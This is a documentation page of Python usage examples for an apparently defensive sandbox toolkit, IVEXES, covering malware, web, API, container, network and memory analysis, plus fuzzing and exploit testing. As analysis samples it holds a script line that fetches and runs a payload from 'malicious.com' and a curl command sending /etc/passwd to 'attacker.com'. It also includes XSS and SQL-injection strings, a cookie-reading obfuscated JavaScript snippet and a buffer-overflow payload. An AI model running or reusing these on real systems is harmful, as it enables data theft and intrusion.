# Sandbox Analysis Examples

This guide demonstrates how to use IVEXES sandbox capabilities for dynamic analysis of potentially malicious files and applications.

## Basic Binary Analysis

### Analyzing a Suspicious Executable

```python
from ivexes.sandbox import Sandbox
from ivexes.report import ReportGenerator

# Initialize sandbox with security-focused configuration
sandbox = Sandbox(
    timeout=300,
    network_enabled=False,  # Isolated analysis
    capture_network=True,
    trace_syscalls=True
)

# Analyze suspicious binary
result = sandbox.execute("/path/to/suspicious_binary")

# Examine results
print("Execution Summary:")
print(f"Exit Code: {result.exit_code}")
print(f"Runtime: {result.execution_time}s")
print(f"System Calls: {len(result.system_calls)}")
print(f"File Operations: {len(result.file_operations)}")

# Look for suspicious behavior
suspicious_patterns = sandbox.analyze_behavior(result)
if suspicious_patterns.privilege_escalation:
    print("⚠️  Privilege escalation detected!")

if suspicious_patterns.network_activity:
    print("⚠️  Network communication attempts detected!")

if suspicious_patterns.file_manipulation:
    print("⚠️  Suspicious file operations detected!")
```

### Malware Family Detection

```python
# Analyze malware sample with family detection
malware_result = sandbox.execute(
    "/samples/unknown_malware.exe",
    enable_yara_scanning=True,
    capture_memory_dumps=True
)

# Check for known malware families
family_detection = sandbox.classify_malware_family(malware_result)
print(f"Potential Family: {family_detection.family_name}")
print(f"Confidence: {family_detection.confidence}")
print(f"Indicators: {family_detection.matching_indicators}")

# Generate detailed report
report_gen = ReportGenerator()
malware_report = report_gen.generate_malware_analysis_report(
    sandbox_result=malware_result,
    family_detection=family_detection
)
```

## Web Application Security Testing

### Automated Web App Scanning

```python
from ivexes.sandbox import WebApplicationSandbox
from ivexes.tools import WebScanner

# Set up web application sandbox
web_sandbox = WebApplicationSandbox(
    target_url="http://vulnerable-app.local",
    browser_timeout=60,
    capture_requests=True,
    enable_javascript=True
)

# Perform automated security scanning
scanner_results = web_sandbox.scan_application([
    "sql_injection",
    "xss",
    "csrf",
    "directory_traversal",
    "file_upload"
])

# Analyze results
for vulnerability in scanner_results.vulnerabilities:
    print(f"Found {vulnerability.type}: {vulnerability.description}")
    print(f"Severity: {vulnerability.severity}")
    print(f"URL: {vulnerability.url}")
    print(f"Payload: {vulnerability.payload}")
    print("---")

# Test specific vulnerability
xss_payload = "<script>alert('XSS')</script>"
xss_result = web_sandbox.test_xss(
    target_parameter="search",
    payload=xss_payload,
    url="/search.php"
)

if xss_result.vulnerable:
    print("✓ XSS vulnerability confirmed")
    print(f"Response contained: {xss_result.evidence}")
```

### API Security Testing

```python
from ivexes.sandbox import APISandbox

# Test REST API security
api_sandbox = APISandbox(
    base_url="https://api.example.com",
    authentication={
        "type": "bearer",
        "token": "your_api_token"
    }
)

# Test for common API vulnerabilities
api_results = api_sandbox.security_test([
    "injection_attacks",
    "authentication_bypass",
    "authorization_flaws",
    "rate_limiting",
    "data_exposure"
])

# Test specific endpoints
endpoint_results = api_sandbox.test_endpoint(
    method="POST",
    path="/api/v1/users",
    payload={"username": "admin'; DROP TABLE users; --"},
    expected_status=400
)

if endpoint_results.sql_injection_detected:
    print("🚨 SQL Injection vulnerability found!")
```

## Container Security Analysis

### Docker Container Assessment

```python
from ivexes.sandbox import ContainerSandbox
from ivexes.tools import ContainerScanner

# Analyze Docker container for security issues
container_sandbox = ContainerSandbox()

# Scan container image
image_results = container_sandbox.scan_image(
    image="suspicious_app:latest",
    scan_types=[
        "vulnerability_scan",
        "configuration_audit",
        "secret_detection",
        "malware_scan"
    ]
)

# Runtime analysis
runtime_results = container_sandbox.run_and_analyze(
    image="suspicious_app:latest",
    command=["./app", "--config", "/etc/app.conf"],
    monitor_duration=180
)

# Check for container escape attempts
escape_analysis = container_sandbox.detect_escape_attempts(runtime_results)
if escape_analysis.escape_detected:
    print("⚠️  Container escape attempt detected!")
    for technique in escape_analysis.techniques_used:
        print(f"  - {technique}")

# Analyze network communication
network_analysis = container_sandbox.analyze_network_traffic(runtime_results)
for connection in network_analysis.external_connections:
    print(f"External connection: {connection.destination}:{connection.port}")
```

## Script Analysis

### Python Script Security Analysis

```python
# Analyze potentially malicious Python script
python_script = """
import os
import subprocess
import urllib.request

# Download and execute payload
urllib.request.urlretrieve("http://malicious.com/payload.py", "/tmp/payload.py")
subprocess.run(["python", "/tmp/payload.py"])
os.system("curl http://attacker.com/exfiltrate?data=$(cat /etc/passwd)")
"""

script_result = sandbox.execute_script(
    script_content=python_script,
    language="python",
    monitor_network=True,
    block_network=True  # Prevent actual execution of malicious commands
)

# Analyze script behavior
behavioral_analysis = sandbox.analyze_script_behavior(script_result)
print("Script Analysis Results:")
print(f"Network requests attempted: {len(behavioral_analysis.network_attempts)}")
print(f"File operations: {len(behavioral_analysis.file_operations)}")
print(f"System commands: {len(behavioral_analysis.system_commands)}")

# Static analysis of script content
from ivexes.code_browser import CodeBrowser
code_browser = CodeBrowser()
static_analysis = code_browser.analyze_script(python_script, language="python")

dangerous_functions = static_analysis.find_dangerous_functions()
for func in dangerous_functions:
    print(f"Dangerous function used: {func.name} at line {func.line}")
```

### JavaScript Analysis

```python
# Analyze obfuscated JavaScript
js_code = """
var _0x1234 = ['eval', 'atob', 'charAt', 'fromCharCode'];
eval(atob('ZG9jdW1lbnQuY29va2ll'));
"""

js_result = sandbox.execute_script(
    script_content=js_code,
    language="javascript",
    browser_context=True,
    monitor_dom_changes=True
)

# Deobfuscate and analyze
deobfuscated = sandbox.deobfuscate_javascript(js_code)
print("Deobfuscated code:")
print(deobfuscated.readable_code)

# Check for malicious patterns
malicious_patterns = sandbox.detect_malicious_js(deobfuscated)
for pattern in malicious_patterns:
    print(f"Malicious pattern: {pattern.type} - {pattern.description}")
```

## Network Traffic Analysis

### Packet Capture and Analysis

```python
from ivexes.sandbox import NetworkSandbox

# Capture and analyze network traffic
network_sandbox = NetworkSandbox(
    capture_interface="eth0",
    capture_duration=300,
    enable_deep_packet_inspection=True
)

# Run application while capturing traffic
app_result = network_sandbox.execute_with_capture(
    "/path/to/network_app",
    capture_filters=["tcp", "udp", "icmp"]
)

# Analyze captured traffic
traffic_analysis = network_sandbox.analyze_traffic(app_result.pcap_file)

# Look for suspicious patterns
suspicious_traffic = traffic_analysis.find_suspicious_patterns([
    "data_exfiltration",
    "command_and_control",
    "port_scanning",
    "dns_tunneling"
])

for pattern in suspicious_traffic:
    print(f"Suspicious activity: {pattern.type}")
    print(f"Source: {pattern.source_ip}")
    print(f"Destination: {pattern.destination_ip}")
    print(f"Description: {pattern.description}")

# Extract IOCs from traffic
iocs = traffic_analysis.extract_iocs()
print(f"Extracted {len(iocs.domains)} domains")
print(f"Extracted {len(iocs.ips)} IP addresses")
print(f"Extracted {len(iocs.urls)} URLs")
```

## Memory Analysis

### Memory Dump Analysis

```python
from ivexes.sandbox import MemoryAnalyzer

# Create memory dumps during execution
memory_analyzer = MemoryAnalyzer()

process_result = sandbox.execute(
    "/path/to/binary",
    create_memory_dumps=True,
    dump_interval=30  # Every 30 seconds
)

# Analyze memory dumps
for dump in process_result.memory_dumps:
    memory_analysis = memory_analyzer.analyze_dump(dump.file_path)
    
    # Look for injected code
    injected_code = memory_analysis.find_code_injection()
    if injected_code:
        print(f"Code injection detected in dump {dump.timestamp}")
        
    # Extract strings and artifacts
    strings = memory_analysis.extract_strings(min_length=8)
    interesting_strings = [s for s in strings if memory_analyzer.is_interesting(s)]
    
    print(f"Interesting strings found: {len(interesting_strings)}")
    for string in interesting_strings[:10]:  # First 10
        print(f"  - {string}")
    
    # Check for crypto artifacts
    crypto_artifacts = memory_analysis.find_crypto_artifacts()
    if crypto_artifacts:
        print("Cryptographic artifacts found:")
        for artifact in crypto_artifacts:
            print(f"  - {artifact.type}: {artifact.value}")
```

## Vulnerability Research

### Fuzzing Integration

```python
from ivexes.sandbox import FuzzingSandbox

# Set up fuzzing environment
fuzzing_sandbox = FuzzingSandbox(
    target_binary="/path/to/target",
    crash_detection=True,
    coverage_tracking=True,
    timeout_per_run=10
)

# Generate and test inputs
fuzzing_results = fuzzing_sandbox.fuzz(
    input_template="@@",  # AFL-style input
    max_iterations=10000,
    mutation_strategies=["bitflip", "arithmetic", "dictionary"]
)

# Analyze crashes
for crash in fuzzing_results.crashes:
    crash_analysis = fuzzing_sandbox.analyze_crash(crash)
    
    print(f"Crash found: {crash.input_hash}")
    print(f"Signal: {crash.signal}")
    print(f"Exploitability: {crash_analysis.exploitability}")
    
    if crash_analysis.exploitability == "high":
        print("🎯 Potentially exploitable crash!")
        
        # Generate proof of concept
        poc = fuzzing_sandbox.generate_poc(crash)
        print(f"PoC saved to: {poc.file_path}")
```

### Binary Exploitation

```python
from ivexes.sandbox import ExploitSandbox

# Test exploit development
exploit_sandbox = ExploitSandbox(
    target_binary="/vulnerable/binary",
    enable_debugging=True,
    track_execution_flow=True
)

# Test buffer overflow exploit
exploit_payload = b"A" * 100 + b"\x41\x42\x43\x44"  # Simple overflow

exploit_result = exploit_sandbox.test_exploit(
    payload=exploit_payload,
    input_method="stdin",
    expected_outcome="control_flow_hijack"
)

if exploit_result.successful:
    print("✓ Exploit successful!")
    print(f"Control achieved at: {exploit_result.control_point}")
    
    # Generate ASLR bypass
    if exploit_result.aslr_present:
        bypass_payload = exploit_sandbox.generate_aslr_bypass(exploit_result)
        print(f"ASLR bypass payload: {bypass_payload.hex()}")
```

## Reporting and Documentation

### Comprehensive Analysis Report

```python
from ivexes.report import AnalysisReport

# Combine multiple analysis results
comprehensive_analysis = {
    "static_analysis": code_browser.analyze_file("target.c"),
    "dynamic_analysis": sandbox.execute("target"),
    "network_analysis": network_sandbox.capture_traffic(),
    "memory_analysis": memory_analyzer.analyze_dumps(),
}

# Generate comprehensive report
report = AnalysisReport(
    title="Security Analysis of Target Application",
    analyst="Security Team",
    date="2024-01-15"
)

report.add_executive_summary(comprehensive_analysis)
report.add_technical_findings(comprehensive_analysis)
report.add_recommendations()
report.add_appendices()

# Export in multiple formats
report.export_pdf("comprehensive_analysis.pdf")
report.export_html("analysis_report.html")
report.export_json("analysis_data.json")

# Generate STIX threat intelligence
stix_report = report.export_stix()
print(f"STIX report saved: {stix_report.file_path}")
```

## Best Practices

### Security Considerations

1. **Isolation**: Always run analysis in isolated environments
2. **Network Segmentation**: Use network isolation for malware analysis
3. **Resource Limits**: Set appropriate timeouts and resource constraints
4. **Data Sanitization**: Clean sensitive data from reports
5. **Chain of Custody**: Maintain evidence integrity

### Performance Optimization

1. **Parallel Execution**: Run multiple analyses simultaneously
2. **Caching**: Cache common analysis results
3. **Resource Monitoring**: Monitor system resource usage
4. **Selective Analysis**: Focus on relevant attack vectors
5. **Incremental Analysis**: Use incremental updates where possible

### Documentation Standards

1. **Reproducible Results**: Document exact commands and configurations
2. **Evidence Preservation**: Save all artifacts and logs
3. **Timeline Documentation**: Maintain detailed analysis timeline
4. **Methodology Notes**: Document analysis approach and tools used
5. **Validation Steps**: Include verification and validation procedures

## See Also

- [Sandbox User Guide](../user-guide/sandbox.md)
- [Code Browser Examples](code-analysis.md)
- [API Reference](../api/sandbox.md)
- [Configuration Guide](../getting-started/configuration.md)